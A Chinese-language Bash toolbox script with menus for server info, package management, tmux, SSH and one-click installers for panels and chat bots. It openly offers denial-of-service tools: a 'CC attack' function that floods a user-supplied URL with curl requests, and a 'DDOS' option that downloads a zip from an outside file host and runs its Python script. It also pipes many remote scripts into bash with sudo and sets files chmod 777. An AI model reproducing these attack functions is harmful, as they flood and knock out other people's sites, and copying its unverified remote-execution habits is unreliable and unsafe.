#!/bin/bash
#本脚本由NAS油条制作
#NAS油条的实用脚本
#2025/6/19

#主菜单
menu_jc() {
menu() {
clear
while true
do
clear;clear
echo
echo "NAS油条的实用脚本v2.2.4"
figlet N A S
check_Script_Install
echo "1) Termux_Linux工具箱(旧)"
br
echo "2) Linux工具箱(安装|更新|Linux)"
echo "3) Linux工具箱(在线|启动|通用)"
br
echo "感谢QQ:2738136724做出贡献。"
br
echo "0) 退出"
br
read -p "请选择(回车键默认): " menu
case $menu in
1)
   git clone https://gitee.com/nasyt/nasyt-linux-tool.git
   bash nasyt-linux-tool/nasyt-linux-tool.sh;;
2)
   gx;esc;;
3) 
   break;;
default)
   break;;
0) 
   exit 0;;
*)
   break;;
esac
done
}

if command -v termux-info >/dev/null 2>&1; then
    break
else
    menu
fi
}
# 检查包管理器的函数
check_package_manager() {
    clear
    if command -v termux-info >/dev/null 2>&1; then
        sys="(Termux 终端)"
        PACKAGE_MANAGER="pkg"
        jc="1"
        USE_SUDO=
    elif command -v apt-get >/dev/null 2>&1; then
        sys="(Debian/Ubuntu 系列)"
        PACKAGE_MANAGER="apt"
        jc="0"
        USE_SUDO=sudo
    elif command -v yum >/dev/null 2>&1; then
        sys="(RHEL/CentOS 7 及更早版本)"
        PACKAGE_MANAGER="yum"
        jc="0"
        USE_SUDO=sudo
    elif command -v dnf >/dev/null 2>&1; then
        sys="(Fedora/RHEL/CentOS 8 及更高版本)"
        PACKAGE_MANAGER="dnf"
        USE_SUDO=sudo
    elif command -v pacman >/dev/null 2>&1; then
        sys="(Arch Linux 系列)"
        PACKAGE_MANAGER="pacman"
        USE_SUDO=sudo
    elif command -v zypper >/dev/null 2>&1; then
        sys="(openSUSE 系列)"
        PACKAGE_MANAGER="zypper"
        USE_SUDO=sudo

    else
        echo ">_<未检测到支持的系统。"
        read -p "但是脚本依然可以运行。"
        br
    fi
}

#检查dialog figlet安装
main_install() {
dialog_install() {
if command -v dialog &> /dev/null
then
    echo "dialog 已经安装，跳过安装步骤。"
else 
    echo "正在使用 $PACKAGE_MANAGER 安装dialog"
    $USE_SUDO $PACKAGE_MANAGER install dialog -y
fi

}
figlet_install() {
if command -v figlet &> /dev/null
then
    echo "figlet 已经安装，跳过安装步骤。"
else 
    echo "正在使用 $PACKAGE_MANAGER 安装figlet"
    $USE_SUDO $PACKAGE_MANAGER install figlet -y
fi
  }
  dialog_install
  figlet_install
}

#全部变量
all_variable() {
tempfile=$(mktemp 2>/dev/null) || tempfile=/tmp/test$$
uptime=$(uptime -p) #原版命令变量
uptime_cn=$(echo $uptime | sed 's/up/已运行/; s/hour/时/; s/minutes/分/; s/day/天/; s/months/月/')
server_ip=$(hostname -I) #服务器IP
tmux_ls=$(tmux ls) #tmux转中文
tmux_ls_cn=$(echo "$tmux_ls" | sed -E 's/windows//g; s/created/创建于/g; s/^( *)创建于 /\1创建于\\/; s/^/窗口名字: /')
download_dir="$HOME/Downloads"
OUTPUT_FILE="nasyt" #下载文件名
TIMEOUT=10  # curl超时时间（秒）
URLS=(
  "https://linux.class2.icu/shell/nasyt.sh"    # 主链接
  "https://nasyt.class2.icu/shell/nasyt.sh"  # 备用链接1
  "https://nasyt2.class2.icu/shell/nasyt.sh"  # 备用链接2
)
}

#定义颜色
color_variable() {
white='\033[0m'
green='\033[0;32m'
blue='\033[0;34m'
red='\033[31m'
yellow='\033[33m'
grey='\e[37m'
pink='\033[38;5;218m'
cyan='\033[96m'
}

#函数
server_ip() {
echo "当前IP为: $server_ip"
}
uptime_cn() {
dialog --msgbox "系统已运行: $uptime_cn" 0 0
}
br() {
echo -e "\e[1;34m--------------------------\e[0m"
}
esc() {
read -p "按回车键继续..."
}
cw() {
echo "无效的输入。";esc
}
ts_bl_bl() {
echo "暂无"
}

#检查本脚本是否已安装
check_Script_Install() {
if command -v nasyt &> /dev/null
then
    echo "脚本已安装,可直接输入nasyt进入本界面"
else 
    echo "nasyt脚本未安装(无影响)"
fi
br

}

#主菜单
show_menu() {
dialog --title "NAS油条Linux工具箱" \
--menu "当前版本:v2.2.4\n2025年6月21日更新\n本工具箱由NAS油条制作\nQQ群:610699712\n请选择你要启动的项目：" \
0 0 10 \
1 "查询菜单" \
2 "系统工具" \
3 "网络工具" \
4 "安装工具" \
5 "软件安装" \
6 "其它脚本" \
7 "更新脚本" \
8 "更新日志" \
0 "退出脚本" \
2> $tempfile
choice=$(cat $tempfile)
#
}

#查看菜单
look_menu() {
  clear
  br
  echo "1) 服务器运行时间"
  echo "2) 服务器配置信息"
  echo "3) 服务器IP地址"
  echo "4) 本机系统log"
  echo "5) 服务器地理位置"
  echo "0) 返回上层"
  
}

# 系统操作
system_menu() {
br
echo "1) 软件包管理"
echo "2) 更新软件包"
echo "3) 文件解压缩"
echo "4) ssh管理工具"
echo "0) 返回"
br
}

#安装常用工具。
often_tool() {
clear
br
echo "1) 安装Alist多储存资源盘"
echo "2) 安装BT宝塔面板"
echo "3) 安装AMH面板"
echo "4) 安装1panel面板"
echo "5) 安装MCSManager面板"
echo "6) 安装cpolar内网穿透"
echo "7) 安装DDOS攻击(请勿非法用途。)"
echo "8) 安装Secluded机器人"
echo "9) 安装TRSS机器人"
echo "10) 安装Astrbot机器人"
echo "11) 安装SFS游戏服务器"
echo "12) 安装橡素工厂146服务器(无)"
echo "13) 安装小皮面板"
echo "0) 返回上层菜单"
br
}

#软件安装
app_install() {
echo "暂未开发。"
br
echo "1) 安装QQ"
echo "2) 安装微信"
echo "3) 安装steam"
echo "0) 返回"
br
}

#网络常用工具
Internet_tool() {
br
echo "1) ping工具"
echo "2) CC攻击"
echo "3) tmux终端工具"
echo "4) TMOE工具"
echo "5) nmap扫描工具"
echo "6) ranger文件管理工具"
echo "7) Mono-C#编译工具"
echo "0) 返回上层菜单"
br
}

#各种服务器脚本。
Linux_shell () {
clear
br
echo "1) 亚洲云LinuxTool脚本工具"
echo "2) 木空云LinuxTool脚本工具"
echo "0) 返回上层菜单"
br
}

#调试模式
ts_menu() {
br
echo "1) 命令输出"
echo "2) 函数输出"
echo "3) 变量输出"
echo "4) 补全文件"
echo "0) 返回"
br
}

#文件解压缩
zip_menu() {
br
echo "1) zip文件"
echo "2) tar.gz文件"
echo "0) 返回"
br
}

#ssh工具
ssh_tool_menu() {
br
echo "1) 连接SSH"
echo "2) 启动SSH"
echo "3) 修改密码"
echo "0) 返回"
br
}

#废弃
csh() {
clear
echo "正在使用 $PACKAGE_MANAGER 更新中"
$PACKAGE_MANAGER update -y
echo 正在使用 $PACKAGE_MANAGER 安装curl git dialog figlet中
$PACKAGE_MANAGER install curl git dialog figlet -y
echo 安装完成
esc
}

#ping命令
ping2() {
read -p "请输入ping地址: " ping
ping $ping
}

#CC攻击命令
cc() {
echo "无"
}

#tmux安装
tmux_install() {
if command -v tmux &> /dev/null
then
    echo "tmux 已安装，跳过安装步骤。"
else 
    echo "tmux 未安装 正在使用 $PACKAGE_MANAGER 进行安装"
    $PACKAGE_MANAGER install tmux -y
    read -p " tmux安装完成,回车键继续。"
fi
}

#tmux命令
tmux_tool() {
br
echo "1) 新建tmux窗口"
echo "2) 全部tmux窗口"
echo "3) 重命名tmux窗口"
echo "4) 进入tmux窗口"
echo "5) 杀死tmux窗口"
echo "keys) 查看tmux快捷键"
echo "help) 全部tmux命令"
echo "0) 退出"
br
}

#tmux快捷键
tmux_keys() {
echo "Ctrl+b c：创建一个新窗口，状态栏会显示多个窗口的信息。"
echo "Ctrl+b p：切换到上一个窗口（按照状态栏上的顺序）。"
echo "Ctrl+b n：切换到下一个窗口。"
echo "Ctrl+b <number>：切换到指定编号的窗口，其中的<number>是状态栏上的窗口编号。"
echo "Ctrl+b w：从列表中选择窗口。"
echo "Ctrl+b ,：窗口重命名。"
}

#cpolar内网穿透一键安装。
cpolar_instell() {
echo "选择你的框架"
echo "1) AMD通用安装"
echo "2) Aarch64(无)"
echo "0) 退出"
read -p "请输入选项（1-2）: " opt
case $opt in
1) curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash ;;
2) bash nasyt-linux-tool/cpolar/aarch64.sh ;;
0) exit 1 ;;
*) echo "无效的输入。";esc;;
esac
sleep 1s
echo "脚本结束。"
}

#安装1panel面板
1panel() {
br
echo "1) RedHat / CentOS系统"
echo "2) Ubuntu系统"
echo "3) Debian系统"
echo "4) openEuler / 其他"
echo "0) 返回"
br
}

#Secluded一键安装。
Secluded() {
clear
git clone https://gitee.com/nasyt/Secluded-x64-linux.git
cd Secluded-x64-linux
chmod 777 SecludedLauncher.out.sh
bash SecludedLauncher.out.sh
br
echo "请加入Secluded官方QQ群:615113364"
echo "或者这个群:610699712"
echo "了解详细用法。"
br
esc
}

#安装TRSS机器人
TRSS() {
br
echo "1) 安装TRSS机器人docker版(Linux推荐)"
echo "2) 安装tmoe_proot/chroot容器(Termux推荐)"
echo "d) docker打开TRSS机器人"
echo "0) 返回"
br
}

#安装Astrbot机器人
astrbot() {
echo "官网: https://astrbot.app"
echo "提示: 宝塔上面的docker应用上有现成的"
echo "注意: Astrbot是通过Python运行"
br
echo "1) CentOS系统安装"
echo "2) Debian/Ubuntu安装"
echo "0) 返回"
br
}

#CC攻击
cc() {
echo -----CC攻击-----
read -p "请输入攻击地址" cc_url
read -p "请输入攻击数量:" cc_sl
echo 正在攻击ing...
for ((i=0; i<$cc_sl; i++)); do
curl -s $cc_url > /dev/null
done
echo "CC攻击完成"
}

#nmap扫描工具
nmap_install() {
if command -v nmap &> /dev/null
then
  echo "nmap已安装，正在进入工具界面。"
else
  echo "nmap未安装，正在安装。"
  $PACKAGE_MANAGER install nmap -y
fi
}
nmap_menu() {
nmap_install
echo "提示: 暂时只有一个功能";br
echo "1) 扫描IP"
echo "0) 返回"
br
}

#deb软件包安装
deb_install() {
br
echo "1) 安装网络软件包。"
echo "2) 安装本地软件包。"
echo "3) 卸载软件包。"
echo "0) 返回"
br
}
deb_install_Internet() {
br
read -p "请输入软件包名字: " deb_install_pkg
br
if command -v $deb_install_pkg &> /dev/null
then
    echo "软件包 $deb_install_pkg 已安装。"
else 
    echo "正在使用 $PACKAGE_MANAGER 安装 $deb_install_pkg 中"
    $PACKAGE_MANAGER install $deb_install_pkg -y
fi
br
}
deb_install_localhost() {
echo "提示: 暂时只能安装deb软件包"
br
read -p "请输入软件包地址: " deb_localhost_xz
br
dpkg -i $deb_localhost_xz
}
deb_remove() {
echo "卸载但是保留配置文件。"
br
read -p "请输入软件包: " deb_remove_xz
clear
br
$PACKAGE_MANAGER remove $deb_remove_xz -y
br
echo "使用 $PACKAGE_MANAGER 卸载 $deb_remove_xz 软件包成功"
}

#ranger文件管理工具
ranger_install() {
if command -v ranger &> /dev/null
then
    read -p "ranger 已经安装。回车键进入。"
    ranger
else 
    echo "未安装ranger正在安装。"
    $PACKAGE_MANAGER install ranger -y
    echo "ranger安装完成。"
    read-p "按回车键启动。"
    ranger
fi
}

#Mono编译工具
Mono_install() {
br
if command -v mono-complete &> /dev/null
then
    echo "mono-complete已安装。"
else
   echo "未安装Mono编译工具"
   echo "正在安装。"
   $PACKAGE_MANAGER install mono-complete -y
   echo "Mono-C#编译工具安装完成。"
fi
br
}
Mono_menu() {
echo "此页暂时不可用。"
br
echo "1) 编译C#程序"
echo "2) 运行C#程序"
echo "0) 返回"
br
}

gx() {
# 下载安装更新
clear;br
echo "正在删除原脚本。"
rm /usr/bin/nasyt
rm nasyt.sh
echo "正在更新脚本。"
for url in "${URLS[@]}"; do
  clear;br
  echo "▶ 正在尝试从以下地址下载：$url"
  if curl -L -o /usr/bin/nasyt --retry 3 --retry-delay 2 --max-time $TIMEOUT "$url"; then
    br
    echo "✓ 文件下载成功!"
    echo "正在给予脚本权限。"
    chmod 777 /usr/bin/nasyt
    echo "启动命令为nasyt"
    dialog --msgbox "更新|安装成功,请输入nasyt重新进入" 0 0
    exit 0
  else
    echo "✗ 当前链接下载失败，3秒后尝试下一个链接..."
    sleep 3
  fi
done
echo "✗ 所有链接均下载失败，请检查网络或链接有效性"
exit 1
}

#更新列表
gx_log() {
br
echo "2025年6日21日更新v2.2.4版"
echo "添加了三个备用安装更新链接"
echo "以防安装或更新使用不了"
echo "也以防了服务器那边出问题"
echo "部分地方也采用了dialog图形化"
echo "优化了更新日志。"
br
read
echo "2025年6日19日更新v2.2.3版"
echo "修复少量bug"
echo "更新termux检查"
echo "并自动跳过安装界面"
br
read
echo "2025年6日18日更新v2.2.2版"
echo "修复了部分bug"
echo "优化了脚本布局"
echo "提升了脚本效率"
echo "更新figlet文字"
echo "准备更新zsh终端美化"
br
read
echo "2025年5日29日更新v2.2.1版"
echo "更新变量颜色代码"
echo "修复系统工具无法退出bug。"
br
read
echo "2025年5日16日更新v2.2版"
echo "需要定制版的联系NAS油条(免费)"
echo "更新服务器地理位置查询。"
echo "增加了ssh的连接管理工具"
echo "增加了发布页回车键默认选项"
echo "大改了发部页面,更简单明了"
echo "更改了菜单的布局,更好分辨"
echo "增加了小皮面板安装"
echo "修复了系统启动文件bug"
br
read
echo "2025年5日10日更新v2.19.4版"
echo "更新像素工厂146服务器安装(无)"
br
read
echo "2025年5日4日更新v2.19.3版"
echo "更新自动将系统设为中文。"
echo "各位有什么意见"
br
read
echo "2025年5日3日更新v2.19.2版"
echo "更新SFS服务器安装"
br
read
echo "2025年4日25日更新v2.19.1版"
echo "更新zip_7z文件解压"
echo "更新tar.gz文件解压"
echo "简单优化了一下脚本"
br
read
echo "2025年4日20日更新v2.19版"
echo "将脚本发布页融为一体(非常重要)"
echo "删除了调试模式。(其实没有)"
echo "修复了部分bug(真的修了)"
echo "更新ranger文件管理器(豪用)"
echo "增加软件包更新功能。(有用吧)"
br
read
echo "2025年4日18日更新v2.18.5版"
echo "恢复了dialog的安装检测(忘记了)"
echo "完善了deb软件包管理(可能有用吧)"
echo "添加了deb软件包安装的检测。"
echo "优化了脚本的体验。(可能吧!)"
br
read
echo "2025年4日18日更新v2.18版"
echo "优化了脚本的大小(似乎没啥用)"
echo "增加了常用软件安装(摆设)"
echo "增加了deb软件包安装(可能有用吧)"
echo "增加了nmap扫描功能(没更新完)"
echo "更改了系统常用菜单(删了一点东西)"
echo "优化了引导菜单脚本(没有改啥)"
echo "更新1panel面板安装(懒得整合了)"
echo "修了部分bug。(真的吗？)"
br
read
echo "2025年4日17日更新v2.17版"
echo "修复DDOS攻击兼容问题"
echo "更新Astrbot机器人安装"
echo "更新TMOE工具"
echo "修复已知bug"
br
read
echo "2025年4日15日更新v2.16版"
echo "更新TRSS机器人安装"
echo "更新Secluded机器人安装"
br
read
echo "2025年4日14日更新v2.15版"
echo "更新调试模式"
echo "更新tmux命令功能"
echo "修理部分bug"
echo "优化脚本结构"
br
read
echo "2025年4日13日更新v2.14版"
echo "增加了很多功能。"
echo "修复了部分bug。"
echo "修改了提示。"
echo "增加了系统适配。"
br
read
echo "2025年3日30日更新v2.13版"
echo "增加更新功能。"
br
read
echo "2025年3日22日更新v2.12版"
echo "更新DDOS安装和CC攻击"
echo "采用dialog图形形化菜单"
br
read
echo "2025年3月21日更新v2.1 版"
echo "全新的脚本。"
echo "Bug很多。"
br
}

#DDOS攻击安装
ddos() {
cd ddos;python ddos.py
dialog --msgbox "确定开始安装。" 0 0;clear
echo 切换清华下载源;sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list;clear
echo 更新资源中;$PACKAGE_MANAGER update -y && apt upgrade -y;echo 更新完成;clear
echo "正在安装 figlet";$PACKAGE_MANAGER install figlet;clear
echo "正在安装 python";echo 途中可能会停止请输入y继续
echo "等的时间可能有点长,请耐心等待。";$PACKAGE_MANAGER install python -y;clear
echo "正在安装 ddos";curl -o ddos.zip https://cccimg.com/down.php/576c81c114e3a3c1b3e702bd19117594.zip;unzip ddos.zip;clear
echo "清理安装包中";rm ddos.zip
echo "以后请输入以下命令启动";echo python ddos/ddos.py;read -p "回车键继续"
cd ddos;python ddos.py
}


#显示服务器配置信息
show_server_config() {
    clear
    echo "=== 服务器配置信息 ==="
    echo "CPU核心数:"
    lscpu | grep -w "CPU(s):" | grep -v "\-"
    lscpu | grep -w "Model name:"
    echo "CPU频率:"
    lscpu | grep -w "CPU MHz"
    echo "虚拟化类型:"
    lscpu | grep -w "Hypervisor vendor:"
   echo "系统版本:"
    if [ -f /etc/lsb-release ]; then
        . /etc/lsb-release
        echo "Ubuntu $DISTRIB_RELEASE"
    elif [ -f /etc/debian_version ]; then
        DEBIAN_VERSION=$(cat /etc/debian_version)
        echo "Debian $DEBIAN_VERSION"
    elif [ -f /etc/centos-release ]; then
        CENTOS_VERSION=$(cat /etc/centos-release)
        echo "CentOS $CENTOS_VERSION"
    else
        echo "无法识别的系统类型"
    fi
    echo "内存信息:"
    free -h
    echo "硬盘信息:"
    df -h
}

#neofetch工具
ifneofetch(){
if command -v neofetch &> /dev/null
then
    echo "neofetch 已安装，跳过安装步骤。"
    neofetch
    read -p "回车键返回。"
else
    echo "正在安装neofetch"
    apt install neofetch -y
    echo "neofetch安装完成"
fi

}

# 一键修改密码
change_password() {
    username=$(whoami)
    sudo passwd "$username"
    echo "密码已成功修改。"
}

# 函数：显示服务器地理位置
show_server_location() {
    curl ipinfo.io
}

# 函数：显示服务器地理位置（中文）
show_server_location2() {
    clear;br;curl iplark.com;esc
}



# 同步上海时间函数
sync_shanghai_time() {
    install_ntpdate
    echo "正在同步上海时间..."
    sudo timedatectl set-timezone Asia/Shanghai
    sudo ntpdate cn.pool.ntp.org
    echo "时间同步完成。"
}

# 获取操作系统信息的函数
get_os_info() {
clear
    br
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        echo "操作系统: $PRETTY_NAME"
        echo "ID: $ID"
        echo "版本: $VERSION_ID"
    elif command -v termux-info >/dev/null 2>&1; then
        echo "操作系统: Android (Termux)"
        echo "当前系统: $sys"
        echo "通过 termux-info 获取更多信息:"
        echo "请输入termux-info查看"
    else
        echo "无法获取操作系统信息。"
    fi
    br
}


#提示
point_out() {
get_os_info # 获取操作系统信息的函数
}

#检查
introduce() {
export LANG=zh_CN.UTF-8 #设置编码为中文。
source ~/.bashrc #更新启动文件
check_package_manager #检查包管理器。
main_install #检查dialog figlet是否安装。
check_Script_Install #检查本脚本是否安装。
}

#开始
index_main() {
all_variable #全部变量
color_variable #定义颜色
introduce #检查
menu_jc #菜单发布页
point_out #提示
read -p "回车键启动脚本,Ctrl+C退出" ts_menu_start
case $ts_menu_start in
ts) 
        while true
          do
          clear
          ts_menu
          read -p "请选择调试模式。" ts_xz
           case $ts_xz in
            1)
               clear
               br
               read -p "请输入命令:" ts_ml;clear
               echo "正在执行 $ts_ml 执行结果:";br
               bash -c "$ts_ml";br
               echo "$ts_ml 命令执行完毕。 "
               esc
               ;;
            2) 
               clear
               read -p "请输入函数:" ts_hs
               br
               ts_hs
               echo "$ts_hs 函数输出完毕。 "
               esc
               ;;
            3)
               read -p "请输入变量:" ts_bl;br
               bash -c "echo $(echo $ts_bl)";br
               echo "$ts_bl 变量输出完毕。 "
               esc
               ;;
           4)
               csh
               esc
               ;;
            0)
               break
               ;;
            *) 
               dialog --msgbox "无效的输入。" 0 0
               esc
               ;;
           esac
          done
          ;;
esac
clear
while true
do
clear
show_menu  #主菜单
case $choice in
       csh)
          csh;;
          #工具箱初始化
       1)
          #查看功能
          while true
          do
          clear
          look_menu
          read -p "请输入选项: " csh_xz
          case $csh_xz in
              1) uptime_cn;esc;;
              2) clear;show_server_config;esc;;
              3) server_ip;esc;;
              4) ifneofetch;;
              5) show_server_location2;;
              0) break;;
              *) cw;;
            esac
          done
          ;;
       2)
          while true
          do
              clear
              system_menu
              read -p "请输入选项: " system_choice
              case $system_choice in
                  1)
                     while true
                     do
                       clear
                       deb_install
                       read -p "请选择: " deb_install_xz
                       case $deb_install_xz in
                          1)
                             clear
                             deb_install_Internet
                             esc
                             ;;
                          2)
                             clear
                             deb_install_localhost
                             esc
                             ;;
                          3)
                             clear
                             deb_remove
                             esc
                             ;;

                          0)
                             clear
                             break
                             ;;
                          *)
                             clear
                             dialog --msgbox "无效的输入。" 0 0
                             esc
                             ;;
                       esac
                     done
                     ;;
                  2)
                     dialog --msgbox "确定开始更新。" 0 0
                     br
                     $PACKAGE_MANAGER upgrade -y
                     $PACKAGE_MANAGER update -y
                     br
                     esc
                     ;;
                  3)
                     while true
                     do
                        clear
                        zip_menu
                        read -p "请选择: " zip_menu_xz
                          case $zip_menu_xz in
                             1)
                                clear;echo "可能没啥用";br;ls;br
                                echo "请输入文件地址(/**/**.zip)"
                                read zip_zip
                                unzip $zip_zip;br
                                echo "解压文件成功";esc
                                ;;
                             2)
                                clear;br;ls;br
                                echo "请输入文件地址(/**/**.tar.gz)"
                                read tar_gz_xz;br
                                tar -xzvf $tar_gz_xz;br
                                echo "解压文件完成";esc
                                ;;
                             0)
                                break
                                ;;
                             *)
                                echo "无效的输入"
                                esc
                                ;;
                          esac
                     done
                     ;;
                  4)
                     while true
                     do
                       clear
                       ssh_tool_menu
                       read -p "请选择:" ssh_tool_xz
                             case $ssh_tool_xz in
                                1)
                                   clear;br
                                   read -p "请输入IP: " ssh_tool_ip
                                   read -p "请输入端口: " ssh_tool_port
                                   read -p "请输入用户: " ssh_tool_user;br
                                   echo "正在连接 $ssh_tool_ip 服务器中。";br
                                   ssh -p $ssh_tool_port $ssh_tool_user@ssh_tool_ip;br
                                   echo "连接已断开";esc
                                   ;;
                                2)
                                   echo "正在启动ssh中"
                                   sshd;echo "启动完成。";esc
                                   ;;
                                3)
                                   clear;br
                                   read -p "请输入密码:" ssh_tool_passwd
                                   $USE_SUDO passwd $ssh_tool_passwd
                                   echo "修改密码为 $ssh_tool_passwd 成功。"
                                   esc
                                   ;;
                                0)
                                   break
                                   ;;
                                *)
                                   dialog --msgbox "无效的输入。" 0 0
                                   esc;;
                             esac
                     done
                     ;;
                  0)
                     clear
                     break
                     ;;
                  *)
                     dialog --msgbox "无效的输入。" 0 0
                     ;;
              esac
          done
          ;;
       
       3)
          while true
          do
          clear
          Internet_tool
          read -p "请输入选项: " Internet_tool
             case $Internet_tool in
               1) 
                  ping2
                  esc
                  ;;
               2)
                  cc
                  esc
                  ;;
               3)
                  #tmux工具
                  while true
                  do
                  clear
                  tmux_install
                  tmux_tool
                  read -p "请输入选项: " tmuxtool
                   case $tmuxtool in
                     1) 
                        clear
                        read -p "请输入窗口名字: " new_tmux
                        echo "创建 $new_tmux 窗口成功。"
                        echo "Ctrl+B D离开窗口"
                        read -p "回车键进入。"
                        tmux new -s "$new_tmux"
                        esc;;
                        
                     2) 
                        clear;br
                        echo "$tmux_ls_cn";br
                        esc
                        ;;
                     3)
                        clear;br
                        echo "$tmux_ls_cn";br
                        read -p "请输入要重命名的窗口: " rename_tmux_1
                        read -p "重命名为: " rename_tmux_2
                        tmux rename-session -t $rename_tmux_1 $rename_tmux_2
                        echo "将 $rename_tmux_1 重命名 $rename_tmux_2 成功"
                        esc
                        ;;
                     4)
                        clear;br
                        echo "$tmux_ls_cn";br
                        read -p "请输入要进入的窗口号: " join_tmux
                        tmux attach -t $join_tmux
                        esc
                        ;;
                     5)
                        clear;br
                        echo "$tmux_ls_cn";br
                        read -p "请输入要杀死的窗口: " kill_tmux
                        tmux kill-session -t $kill_tmux
                        echo "杀死 $kill_tmux 窗口成功"
                        esc
                        ;;
                        
                     help)
                        tmux list-commands;br
                        esc
                        ;;
                     0) 
                        break
                        ;;
                     keys)
                        clear
                        tmux_keys
                        esc
                        ;;
                     *) 
                     dialog --msgbox "无效的输入。" 0 0
                     esc
                     ;;
                   esac
                  done
                  ;;
               4)
                  awk -f <(curl -L gitee.com/mo2/linux/raw/2/2.awk)
                  esc
                  ;;
               5)
                  clear
                  nmap_menu
                  esc
                  ;;
               6)
                  clear
                  ranger_install
                  esc
                  ;;
               7)
                  Mono_install
                  Mono_menu
                  esc
                  ;;
               0) 
                  break
                  ;;
               *) 
                  dialog --msgbox "无效的输入。" 0 0
                  esc
                  ;;
             esac
          done
          ;;
       4)
          while true
          do
            clear
            often_tool
            read -p "请输入选项: " often_tool
              case $often_tool in
                1)
                   clear
                   curl -fsSL "https://alist.nn.ci/v3.sh" -o v3.sh
                   bash v3.sh
                   esc
                   ;;
                2) 
                   clear
                   if [ -f /usr/bin/curl ];then
                   curl -sSO https://download.bt.cn/install/install_panel.sh
                   else wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh
                   fi
                   bash install_panel.sh ed8484bec
                   read -p "安装bt完成 回车键返回。"
                   ;;
                3) 
                   clear
                   wget http://dl.amh.sh/amh.sh
                   bash amh.sh acc 48677
                   esc
                   ;;
                4)
                   while true
                   do
                      clear
                      1panel
                      read -p "请选择你的系统: " 1panel_xz
                      case $1panel_xz in
                         1)
                            curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh && sh quick_start.sh
                            esc
                            ;;
                         2)
                            curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh
                            sudo bash quick_start.sh
                            esc
                            ;;
                         3)
                            curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh
                            bash quick_start.sh
                            esc
                            ;;
                         4)
                            echo "安装 docker中"
                            bash <(curl -sSL https://linuxmirrors.cn/docker.sh)
                            clear;echo "安装 1Panel中"
                            curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh && sh quick_start.sh
                            esc
                            ;;
                         0)
                            break
                            ;;
                         *)
                            clear
                            dialog --msgbox "无效的输入。" 0 0
                            esc
                            ;;
                      esac
                   done
                   ;;
                5)
                   sudo su -c "wget -qO- https://script.mcsmanager.com/setup_cn.sh | bash"
                   esc
                   ;;
                6) 
                   clear
                   cpolar_instell
                   esc
                   ;;
                7)
                   clear
                   ddos
                   esc
                   ;;
                8)
                   clear
                   Secluded
                   esc
                   ;;
                9)
                   while true
                   do
                      clear
                      TRSS
                      read -p "请选择: " TRSS_xz
                      case $TRSS_xz in
                         1)
                            clear
                            echo "正在安装中..."
                            bash <(curl -L gitee.com/TimeRainStarSky/TRSS_AllBot/raw/main/Install-Docker.sh)
                            esc
                            ;;
                         2)
                            clear
                            echo "请到官方查看食用教程"
                            echo "https://trss.me/Install/TMOE.html"
                            read -p "回车键继续。"
                            awk -f <(curl -L gitee.com/mo2/linux/raw/2/2.awk)
                            esc
                            ;;
                         3)
                            clear
                            tsab
                            esc
                            ;;
                         0)
                            clear
                            break
                            ;;
                         *)
                            clear
                            dialog --msgbox "无效的输入。" 0 0
                            esc
                            ;;
                      esac
                   done
                   ;;
                10)
                   while true
                   do
                      clear
                      astrbot
                      read -p "请选择你的系统: " astrbot_xz
                      case $astrbot_xz in
                         1)
                            bash <(curl -sSL https://gitee.com/mc_cloud/mccloud_bot/raw/master/mccloud_install.sh)
                            esc
                            ;;
                         2)
                            wget -O - https://gitee.com/mc_cloud/mccloud_bot/raw/master/mccloud_install_u.sh | bash
                            esc
                            ;;
                         0)
                            break
                            ;;
                         *)
                            dialog --msgbox "无效的输入。" 0 0
                            esc
                            ;;
                      esac
                   done
                   ;;

                11)
                   dialog --msgbox "欢迎使用SFS服务器安装脚本" 0 0
                   echo "脚本作者:NAS油条"
                   echo "感谢:"
                   echo "SFSGamer(QQ:3818483936)"
                   echo "(๑•॒̀ ູ॒•́๑)啦啦(QQ:2738136724)"
                   echo "github地址:https://github.com/AstroTheRabbit/Multiplayer-SFS";br
                   read -p "按回车键开始安装。"
                   curl --output  sfs -o /$HOME/sfs https://linux.class2.icu/shell/sfs_server
                   mv sfs /usr/bin
                   clear
                   chmod +x /usr/bin/sfs
                   echo "快捷启动命令为: sfs"
                   clear;echo "正在运行。";br
                   sfs;br
                   echo "脚本结束。"
                   esc
                   ;;
                12)
                   clear
                   echo "暂无"
                   esc
                   ;;
                13)
                   clear;br;echo "正在安装小皮面板"
                   if [ -f /usr/bin/curl ];then curl -O https://dl.xp.cn/dl/xp/install.sh;else wget -O install.sh https://dl.xp.cn/dl/xp/install.sh;fi;bash install.sh
                   esc
                   ;;
                0)
                   break
                   ;;                   
                *) 
                   dialog --msgbox "无效的输入。" 0 0
                   esc
                   ;;
              esac
            done
            ;;
       5)
          while true
          do
             clear
             app_install
             read -p "请选择要安装的软件: " app_install_xz
               case $app_install_xz in
               1)
                  app_install_qq
                  esc
                  ;;
               0)
                  break
                  ;;
               *)
                  clear
                  dialog --msgbox "无效的输入。" 0 0
                  esc
                  ;;
             esac
          done
          ;;
       6)
          while true
          do
             clear
             Linux_shell
             read -p "请选择:" Linux_shell_xz
             case $Linux_shell_xz in
                1) 
                   curl -L https://gitee.com/krhzj/LinuxTool/raw/main/Linux.sh -o Linux.sh
                   chmod +x Linux.sh
                   bash Linux.sh
                   esc
                   ;;
                2) 
                   curl -O https://linux.mukongyun.com/linux.sh
                   chmod +x linux.sh
                   bash linux.sh
                   esc
                   ;;
                0) 
                   break
                   ;;
                *) 
                   dialog --msgbox "无效的输入。" 0 0
                   esc
                   ;;
             esac
          done
          ;;
       7) 
          gx #脚本更新
          esc
          ;;
       8)
         clear
         gx_log #更新日志
         esc
         ;;
       0)
          break
          clear
          ;;
       esc)
          break
          clear
          ;;
       *) 
          echo "$choice为无效的输入。"
          esc
          ;;
     esac
done
clear
}
#
#
#
index_main